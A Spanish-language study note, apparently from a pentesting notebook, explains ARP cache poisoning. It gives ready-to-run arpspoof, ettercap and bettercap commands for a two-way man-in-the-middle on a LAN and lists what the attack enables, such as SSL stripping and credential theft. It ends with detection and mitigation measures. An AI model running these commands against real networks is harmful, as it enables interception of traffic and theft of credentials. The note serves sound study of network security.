# Qué es ARP Cache Poisoning
Una vez infiltrado dentro de una red, un atacante puede utilizar los *gratuitous ARP replies* spoofeados, modificando la tabla ARP de la víctima para cambiar su default gateway y que todo el tráfico que iba a enviar al router pase por el atacante, de manera que este lo pueda espiar.
En el caso de la imagen, además el atacante cambia la tabla del router para que este 'piense' que PC-A es el propio atacante, interceptando el tráfico en ambos sentidos.

![[ARP-Cache-poisoning.png|728x442]]

# Por qué funciona

**ARP no tiene autenticación.** Cualquiera puede enviar una *ARP reply* no solicitada (*gratuitous ARP*) y la víctima actualiza su tabla sin verificar. Mapea IP→MAC en la LAN.

# Ejecución

```bash
# Habilitar forwarding para no cortar la conexión (MITM transparente)
echo 1 > /proc/sys/net/ipv4/ip_forward

# arpspoof (dsniff) — envenenar en ambos sentidos
arpspoof -i eth0 -t 192.168.1.10 192.168.1.1     # víctima <- soy el router
arpspoof -i eth0 -t 192.168.1.1  192.168.1.10    # router  <- soy la víctima

# Ettercap (MITM completo con plugins)
ettercap -T -M arp:remote /192.168.1.10// /192.168.1.1//

# Bettercap (moderno)
bettercap -iface eth0 -eval "set arp.spoof.targets 192.168.1.10; arp.spoof on; net.sniff on"
```

# Qué habilita (post-MITM)

Sniffing de tráfico, **SSL stripping**, robo de credenciales, manipulación/inyección, DNS spoofing, secuestro de sesiones. Capturar con Wireshark/tcpdump tras el envenenamiento.

# Detección / mitigación

- **Dynamic ARP Inspection (DAI)** + DHCP Snooping en el switch.
- Entradas ARP **estáticas** para el gateway en hosts críticos.
- Herramientas: `arpwatch`, IDS que detectan cambios MAC/duplicados.
- Cifrado extremo a extremo (HTTPS/VPN) limita el impacto del sniffing.

# Recursos
### [[MAC Spoofing]] · [[DHCP Spoofing]]
### [HackTricks — ARP spoofing](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/spoofing-arp)